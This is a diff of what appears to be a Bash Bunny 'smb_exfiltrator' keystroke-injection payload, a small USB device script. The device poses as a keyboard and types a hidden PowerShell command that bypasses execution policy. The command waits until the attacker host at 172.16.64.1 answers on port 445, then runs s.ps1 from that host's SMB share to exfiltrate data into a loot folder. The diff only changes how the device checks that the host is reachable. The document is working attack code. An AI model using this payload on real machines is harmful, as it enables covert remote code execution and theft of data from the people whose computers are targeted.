@@ -48,8 +48,6 @@ rm -rf /loot/smb/*
 cp /root/udisk/payloads/$SWITCH_POSITION/s.ps1 /loot/smb/
 # Make loot directory on USB Disk
 mkdir -p /root/udisk/loot/smb_exfiltrator
-# Disable ICMP/echo replies so our powershell stager doesn't attempt to access the SMB share before smbserver starts (workaround since Test-NetConnection 172.16.64.1 SMB only works on powershell 4.0+ for Windows 8+)
-echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
 
 
 
@@ -59,7 +57,7 @@ LED R B 500
 ATTACKMODE HID
 QUACK GUI r
 QUACK DELAY 500
-QUACK STRING "powershell -WindowStyle Hidden -Exec Bypass \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1) { \\\172.16.64.1\s\s.ps1; exit } }\""
+QUACK STRING "powershell -WindowStyle Hidden -Exec Bypass \"While (\$true) { If ((New-Object net.sockets.tcpclient (172.16.64.1,445)).Connected) { \\\172.16.64.1\s\s.ps1; exit } }\""
 QUACK ENTER
 
 
